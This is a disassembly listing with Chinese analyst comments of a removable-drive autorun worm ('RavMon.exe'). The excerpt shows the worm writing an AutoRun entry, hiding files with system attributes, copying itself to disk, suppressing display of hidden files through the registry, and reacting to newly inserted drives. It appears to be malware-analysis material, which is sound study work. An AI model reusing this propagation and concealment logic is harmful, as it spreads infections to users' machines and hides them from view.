
```asm
00401E04        |.>push    00409368                                     00401E09        |.>push    00409358

; |Key = "shell\explore"

00401E0E        |.>push    004093A4              ; |Section = "AutoRun"

00401E13        |.>call    esi                     ; \WritePrivateProfileStringA

00401E15        |.>lea     ecx, dword ptr [esp+8]

00401E19        |.>push    ecx                    ; /FileName

00401E1A        |.>push    00409348               ; |String = """RavMon.exe -e"""

00401E1F        |.>push    00409330                ; |Key = "shell\explore\Command"

00401E24        |.>push    004093A4                 ; |Section = "AutoRun"

00401E29        |.>call    esi                      ; \WritePrivateProfileStringA

00401E2B        |.>push    7                                            ; /FileAttributes = READONLY|HIDDEN|SYSTEM

00401E2D        |.>lea     edx, dword ptr [esp+C]                       ; |

00401E31        |.>push    edx                    ; |FileName

00401E32        |.>call    edi                      ; \SetFileAttributesA

00401E34        |.>push    80                     ; /FileAttributes = NORMAL

00401E39        |.>lea     eax, dword ptr [esp+110]                     ; |

00401E40        |.>push    eax                    ; |FileName

00401E41        |.>call    edi                     ; \SetFileAttributesA

00401E43        |.>mov     edx, dword ptr [esp+21C]

00401E4A        |.>push    0                    ; /FailIfExists = FALSE

00401E4C        |.>lea     ecx, dword ptr [esp+110]                     ; |

00401E53        |.>push    ecx                  ; |NewFileName

00401E54        |.>push    edx                   ; |ExistingFileName

00401E55        |.>call    dword ptr [409028]                           ; \CopyFileA

00401E5B        |.>push    7                                            ; /FileAttributes = READONLY|HIDDEN|SYSTEM

00401E5D        |.>lea     eax, dword ptr [esp+110]                     ; |

00401E64        |.>push    eax                         ; |FileName

00401E65        |.>call    edi                          ; \SetFileAttributesA

00401E67        |>>mov     ecx, dword ptr [esp+210]

00401E6E        |.>pop     edi

00401E6F        |.>pop     esi

00401E70        |.>call    00403279

00401E75        |.>add     esp, 20C

00401E7B        \.>retn

004013DF         .>add     esp, 8

004013E2         >>mov     eax, ebx

004013E4         .>lea     edx, dword ptr [eax+1]

004013E7         >>mov     cl, byte ptr [eax]

004013E9         .>inc     eax

004013EA         .>test    cl, cl

004013EC         .>jnz     short 004013E7

004013EE         .>sub     eax, edx

004013F0         .>lea     ebx, dword ptr [ebx+eax+1]

004013F4         .>mov     edi, 00409211

004013F9         .>mov     esi, ebx

004013FB         .>mov     ecx, 1

00401400         .>xor     eax, eax

00401402         .>repe    cmps byte ptr es:[edi], by>

00401404         .>jnz     short 004013B0

00401406         >>call    00402370             ；通过修改注册表实现系统将不再显示隐藏文件和扩展名

0040140B         .>xor     eax, eax

0040140D         .>lea     ecx, dword ptr [ecx]

00401410         >>mov     cl, byte ptr [eax+40B730]

00401416         .>mov     byte ptr [esp+eax+2F4], cl

0040141D         .>inc     eax

0040141E         .>test    cl, cl

00401420         .>jnz     short 00401410

00401422         .>lea     edi, dword ptr [esp+2F4]

00401429         .>dec     edi

0040142A         .>lea     ebx, dword ptr [ebx]

00401430         >>mov     al, byte ptr [edi+1]

00401433         .>inc     edi

00401434         .>test    al, al

00401436         .>jnz     short 00401430

00401438         .>mov     ecx, dword ptr [409208]

0040143E         .>mov     edx, dword ptr [40920C]

00401444         .>mov     al, byte ptr [409210]

00401449         .>mov     dword ptr [edi], ecx

0040144B         .>mov     dword ptr [edi+4], edx

0040144E         .>lea     ecx, dword ptr [esp+7C]

00401452         .>push    ecx

00401453         .>lea     edx, dword ptr [esp+2F8]

0040145A         .>push    edx

0040145B         .>mov     byte ptr [edi+8], al

0040145E         .>call    004030D0                   ；把病毒文件复制到本地硬盘

00401463         .>add     esp, 8

00401466         .>test    eax, eax

00401468         .>je      short 004014A4

0040146A         .>mov     esi, 0040B064

0040146F         .>lea     eax, dword ptr [esp+7C]

00401473         >>mov     dl, byte ptr [eax]

00401475         .>mov     bl, byte ptr [esi]

00401477         .>mov     cl, dl

00401479         .>cmp     dl, bl

0040147B         .>jnz     short 0040149B

0040147D         .>test    cl, cl

0040147F         .>je      short 00401497

00401481         .>mov     dl, byte ptr [eax+1]

00401484         .>mov     bl, byte ptr [esi+1]

00401487         .>mov     cl, dl

00401489         .>cmp     dl, bl

0040148B         .>jnz     short 0040149B

0040148D         .>add     eax, 2

00401490         .>add     esi, 2

00401493         .>test    cl, cl

00401495         .>jnz     short 00401473

00401497         >>xor     eax, eax

00401499         .>jmp     short 004014A0

0040149B         >>sbb     eax, eax

0040149D         .>sbb     eax, -1

004014A0         >>test    eax, eax

004014A2         .>je      short 004014B4

004014A4         >>lea     eax, dword ptr [esp+2F4]

004014AB         .>push    eax

004014AC         .>call    00402430

004014B1         .>add     esp, 4

004014B4         >>lea     ecx, dword ptr [esp+2F4]

004014BB         .>push    ecx

004014BC         .>call    004024B0

004014C1         .>add     esp, 4

004014C4         .>test    eax, eax

004014C6         .>jnz     00401590

004014CC         .>push    5                          ; /IsShown = 5

004014CE         .>push    eax                        ; |DefDir

004014CF         .>push    eax                        ; |Parameters

004014D0         .>lea     edx, dword ptr [esp+300]   ; |

004014D7         .>push    edx                        ; |FileName

004014D8         .>push    00409200                   ; |Operation = "open"

004014DD         .>push    eax                        ; |hWnd

004014DE         .>call    dword ptr [40914C]         ; \ShellExecuteA

004014E4         .>jmp     00401590

004014E9         >>cmp     eax, 219

004014EE         .>je      short 00401514

下面是处理WM\_DEVICECHANGE的消息

00401514         >>cmp     dword ptr [esp+50C], 8000                    ;  Case 219 (WM\_DEVICECHANGE) of

switch 0040101B

0040151F         .>jnz     short 00401590

00401521         .>mov     ecx, dword ptr [esp+510]

00401528         .>mov     edx, dword ptr [ecx+C]

0040152B         .>push    edx

0040152C         .>mov     dword ptr [esp+14], 0

00401534         .>call    00401CC0

00401539         .>lea     edi, dword ptr [esp+14]

0040153D         .>add     esp, 4

00401540         .>mov     byte ptr [esp+10], al

00401544         .>dec     edi

00401545         >>mov     al, byte ptr [edi+1]

00401548         .>inc     edi

00401549         .>test    al, al

0040154B         .>jnz     short 00401545

0040154D         .>mov     ax, word ptr [4091FC]

00401553         .>mov     cl, byte ptr [4091FE]

00401559         .>lea     edx, dword ptr [esp+10]

0040155D         .>mov     word ptr [edi], ax

00401560         .>push    edx                                          ; /RootPathName

00401561         .>mov     byte ptr [edi+2], cl                         ; |

00401564         .>call    dword ptr [4090D0]                           ; \GetDriveTypeA

0040156A         .>sub     eax, 2                                       ;  Switch (cases 2..3)

0040156D         .>je      short 0040157E

0040156F         .>dec     eax

00401570         .>jnz     short 00401590

00401572         .>push    0040B858                                     ;  Case 3 of switch 0040156A

00401577         .>lea     eax, dword ptr [esp+14]

0040157B         .>push    eax

0040157C         .>jmp     short 00401588
```
